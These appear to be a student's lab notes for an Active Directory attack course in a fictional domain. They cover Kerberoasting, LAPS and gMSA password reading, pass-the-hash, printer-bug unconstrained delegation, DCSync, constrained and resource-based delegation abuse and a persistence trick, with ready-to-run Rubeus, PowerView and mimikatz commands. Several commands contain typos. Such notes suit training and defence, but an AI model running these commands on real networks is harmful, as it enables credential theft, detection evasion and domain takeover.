
Powerups
~~~
Invoke-Allchecks
~~~

 Abusing services
 ~~~
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student21'
~~~

To identify a machine in the domain where machine has local administrative access.

~~~
Find-LocalAdminAccess -Verbose
~~~

The ActiveDirectory module command Get-
ADPrinicpalGroupMemebsrhip does not provide ability to recursively look for group membership.

Therefore, we can use the following simple PowerShell code from InvisiShell. Note that the code uses the
ActiveDirectory module so that should be imported first:

~~~ 
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
{
$groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName |
select -ExpandProperty distinguishedname)
$groups
if ($groups.count -gt 0)
{
foreach ($group in $groups)
{
Get-ADPrincipalGroupMembershipRecursive $group
}
}
}
~~~




## Kerberoast

Find user accounts used as service accounts

Active  Directory module

~~~
Get-ADUser -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
~~~

Powerview

~~~
Get-DomainUser -SPN
~~~

Use Rubeus to list Kerberoast stats

~~~
Rubeus.exe kerberoast /stats
~~~

Use Rubeus to request a TGS

~~~
Rubeus.exe Kerberoast /user:serviceaccount /simple
~~~

To avoind detections based encryption Downgrade for Kerberos Etype (used by likes of MDI- 0x17 stands for rc4-hmac), look for kerberoastable accounts that only support RC4_HMAC

~~~
Rubeus.exe kerberoast /stats /rc4opsec
~~~

~~~
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec
~~~

kerberoast all possible accounts

~~~
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
~~~

### Local Administrator Password Solutions -LAPS

On  computer ,if LAPS is in use, a library AdmPwd.dll can be dound in the C:\Program Files\Laps\CSE\  directory

To find the who can read the passwords in  clear text machines in  OUs:

 Powerview

~~~
Get-DomainOU | Get DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Covert-SidToName $_.SecurityIdentifier):$_}
~~~

Using Active Directory module 

~~~
Get-LapsPermissions.ps1
~~~

Using LAPS 

~~~
Import-Module C:\AD\Tools\AdmPwd.PS.psd1
~~~

~~~
Find-AdmPwdExtentedRights -Identity OUDistinguishedName
~~~

Once We compromise the user hash the rights, use the following to read clear text passwords:

-Powerview

~~~
Get-DomainObject -Identity <targetmachines> | select -ExpandProperty ms-mcs-admpwd
~~~

-Active Directory Module 

~~~
Get-AdComputer -Identtity <targetmachine> -Properties ms-mcs-admpwd | select -Expandproperty ms-mcs-admpwd
~~~

-Laps Module 

~~~
Get-AdmpwdPassword -ComputerName <target machine>
~~~

### gMSA- Group Managed Service Account

Provides automatic password management . User reads attribute 'msds-ManagedPassword' the gMSA password is computed 

Enumuration 

A gMSA hash object class 'msDS-GroupManagedServiceAccount' .This can be used to find the accounts.

Using ADModule

~~~
Get-ADServiceAccount -Filter *
~~~

Using Powerview 

~~~
Get-DomainObject -LDAPFilter '(ObjectClass-msDS-GroupManagedServiceAccount)'
~~~

The attribute 'msDS-GroupMSAMemberShip' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob

Read it using ADModule:

~~~
GetADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
~~~

  Passing the NTLM hash of the gMSA we get privileges of the gMSA

```
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:hash
```


### Kerberos Delegation

Kerberos Delegation allows to "reuse the end-user credentials to access resources
hosted on a different server".

General/Basic or Unconstrained Delegation which allows the first hop
server (web server in our example) to request access to any service
on any computer in the domain.

Constrained Delegation which allows the first hop server (web server
in our example) to request access only to specified services on
specified computers.


![[Pasted image 20250206220141.png]]


### Unconstrained Delegation

- When unconstrained delegation is enabled, the DC places user's TGT
inside TGS (Step 4 in the previous diagram). When presented to the
server with unconstrained delegation, the TGT is extracted from TGS
and stored in LSASS. This way the server can reuse the user's TGT to
access any other resource as the user.

- This could be used to escalate privileges in case we can compromise the
computer with unconstrained delegation and a Domain Admin connects
to that machine.

 - SeEnableDelegation privileges are needed to configure Unconstrained
Delegation.

Discover domain computers which have unconstrained delegation
enabled using PowerView:

```
Get-DomainComputer -UnConstrained
```

Using ActiveDirectory Module:

```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

We must trick a domain admin or other high privilege user to connect to
a service on us-web.


After the connection, we can export TGTs using the below command:

```
SafetyKatz.exe '"sekurlsa::tickets /export"'
```

The ticket could be reused:

```
SafetyKatz.exe '"kerberos::ptt ticket.kirbi"'
```

#### Unconstrained Delegation with Printer Bug !

How do we trick a high privilege user to connect to a machine with Unconstrained Delegation? The Printer Bug!

A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain
user's choice.

Let's use MS-RPRN.exe (`https://github.com/leechristensen/SpoolSample`) on us-
web:


```
MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```


We can capture the TGT of us-dc$ by using Rubeus on us-web:

```
Rubeus.exe monitor /interval:5
```

Copy the base64 encoded TGT, remove extra spaces and use it on the attacker'
machine:

```
Rubeus.exe ptt /tikcet:
```


Run DCSync:

```
SafetyKatz.exe '"lsadump::dcsync /user:us\krbtgt"'
```

### Constrained Delegation


To impersonate the user, Service for User (S4U) extension is used which provides
two extensions:
− Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a
second service (controlled by SPNs on msDs-AllowedToDelegateTo) on behalf of a
user.
− Service for User to Self (S4U2self) - Allows a service (must have
TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) to obtain a forwardable TGS to
itself on behalf of a user (no actual Kerberos authentication by user takes place).
Used in Protocol Transition i.e. when user authenticates with non-Kerberos
authentication.

 SeEnableDelegation privileges are needed to configure Constrained Delegation.
• Two ways to configure constrained delegation:
- Kerberos only: Kerberos authentication is needed for the service to delegate.
- Protocol transition: Regardless of authentication the service can delegate.

To abuse constrained delegation with protocol transition, we need to
compromise the web service (first hop) account. If we have access to
that account, it is possible to access the services listed in msDS-
AllowedToDelegateTo of the web service account as ANY user.


### Constrained Delegation with Protocol Transition

Using PowerView:

~~~
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
~~~

Using ActiveDirectory module:

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
"$null"} -Properties msDS-AllowedToDelegateTo
```


Use Rubeus s4u module!

```
C:\AD\Tools\Rubeus.exe s4u /user:appsvc
/aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-
mssql.us.techcorp.local /domain:us.techcorp.local /ptt

```


Another interesting issue in Kerberos is that the delegation occurs not
only for the specified service but for any service running under the same
account. There is no validation for the SPN specified.
• The sname field is unencrypted and can be modified while requesting
the TGS for any SPN.
• This is huge as it allows access to many interesting services when the
delegation may be for a non-intrusive service!
account. There is no validation for the SPN specified.
• The sname field is unencrypted and can be modified while requesting
the TGS for any SPN.
• This is huge as it allows access to many interesting services when the
delegation may be for a non-intrusive service!


Using Rubeus:

```
C:\AD\Tools\Rubeus.exe s4u /user:appsvc
/aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2
d6afc3781e114335 /impersonateuser:administrator
/msdsspn:CIFS/us-mssql.us.techcorp.local
/altservice:HTTP /domain:us.techcorp.local /ptt
```


```
winrs -r:us-mssql cmd.exe
```


#### Persistence - msDS-AllowedToDelegateTo

• Note that the msDS-AllowedToDelegateTo is the user account flag which
controls the services to which a user account has access to.
• This means, with enough privileges, it is possible to access any service
from a user – a neat persistence trick.
• Enough privileges? – SeEnableDelegationPrivilege on the DC and full
rights on the target user - default for Domain Admins and Enterprise
Admins.
• That is, we can force set 'Trusted to Authenticate for Delegation' and
ms-DS-AllowedToDelegateTo on a user (or create a new user - which is
more noisy) and abuse it later.

Using PowerView:

Set a Service Principal Name (SPN) for a User

```
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
```

- This assigns an **SPN** (`dev/svc`) to `devuser`.
- This is necessary for **Kerberos authentication**, making `devuser` eligible for delegation.

Configure `msDS-AllowedToDelegateTo`

```
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
```


- This **explicitly allows `devuser` to delegate authentication** to `ldap/us-dc.us.techcorp.local`.
- This means `devuser` can **impersonate** other users when accessing the LDAP service on the DC.


Set `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (UAC Flag)

```
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
```

- The `16777216` flag (`0x01000000`) sets the **"TrustedToAuthenticateForDelegation"** bit in `userAccountControl`.
- This allows **protocol transition**, meaning `devuser1` can authenticate users using Kerberos tickets from other authentication methods (e.g., NTLM).
- **Persistence Trick:** Attackers can exploit this by making `devuser1` a delegation account, then using `S4U2Self` and `S4U2Proxy` to escalate privileges.


Find Users with `TrustedToAuthForDelegation`

```
Get-DomainUser –TrustedToAuth
```

- Lists **all users that have "Trusted to Authenticate for Delegation"** enabled.
- Useful for **identifying potential abuse targets** in Active Directory

Abuse using Rubeus:

```
Rubeus.exe hash /password:Password@123! /user:devuser
/domain:us.techcorp.local
```

```
Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
/impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local
/domain:us.techcorp.local /ptt
```

Dump NTLM hashes for krbtgt Account(DCSync Attack)

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

#### Resource-based Constrained Delegation


We already have access to a domain joined machine.
• Let's enumerate if we have Write permissions over any object.


Using PowerView:

```
Find-InterestingDomainAcl | ?{$_.identityreferencename -
match 'mgmtadmin'}
```

Using the ActiveDirectory module, configure RBCD on us-helpdesk for
student machines :

```
$comps = 'student1$','student2$' Set-ADComputer -Identity us-helpdesk -
PrincipalsAllowedToDelegateToAccount $comps
```

Now, let's get the privileges of studentx$ by extracting its AES keys:

```
SafetyKatz.exe '"sekurlsa::ekeys"'
```

Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we
want:

```
Rubeus.exe s4u /user:student1$
/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk
/impersonateuser:administrator /ptt
```


```
winrs -r:us-helpdesk cmd.exe
```

#### Constrained Delegation -Kerberos Only

• It requires an additional forwardable ticket to invoke S4U2Proxy.
• We cannot use S4U2Self as the service doesn’t have TRUSTED_TO_AUTH_FOR_DELEGATION value configured.

• We can leverage RBCD to abuse Kerberos Only configuration.
- Create a new Machine Account
- Configure RBCD on the machine configured with Constrained Delegation.
- Obtain a TGS/Service Ticket for the machine configured with Constrained 
  Delegation by leveraging the newly created Machine Account.
- Request a new forwardable TGS/Service Ticket by leveraging the ticket created in
  previous step.


Enumerate constrained delegation using ADModule

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

Since ms-DS-MachineAccountQuota is set to 10 for all domain users,
any domain user can create a new Machine Account and join the same
in the current domain.

Create a new Machine Account using Powermad.ps1 script

```
. C:\AD\Tools\Powermad\Powermad.ps1
New-MachineAccount -MachineAccount studentcompX
```

We already compromised us-mgmt.

Configure RBCD on us-mgmt using us-mgmt$ computer account.

```
C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$
/aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d7
4016ed51b2 /impersonateuser:administrator
/domain:us.techcorp.local /ptt /nowrap
```

Using ADModule:

```
Set-ADComputer -Identity us-mgmt$ -
PrincipalsAllowedToDelegateToAccount studentcompX$ -Verbose
```

Obtain a TGS/Service Ticket for us-mgmt (machine configured with
Constrained Delegation) by leveraging the newly created Machine
Account (studentcompx).

```
C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123
```

```
C:\AD\Tools\Rubeus.exe s4u
/impersonateuser:administrator /user:studentcompX$
/rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/us-
mgmt.us.techcorp.local /nowrap
```

Request a new forwardable TGS/Service Ticket by leveraging the ticket
created in previous step.

```
C:\AD\Tools\Rubeus.exe s4u
/tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$
/aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /msdsspn:cifs/us-mssql.us.techcorp.local /altservice:http /nowrap /ptt
```

Access the us-mssql using WinRM as the Domain Admin.

```
winrs -r:us-mssql.us.techcorp.local cmd.exe
```

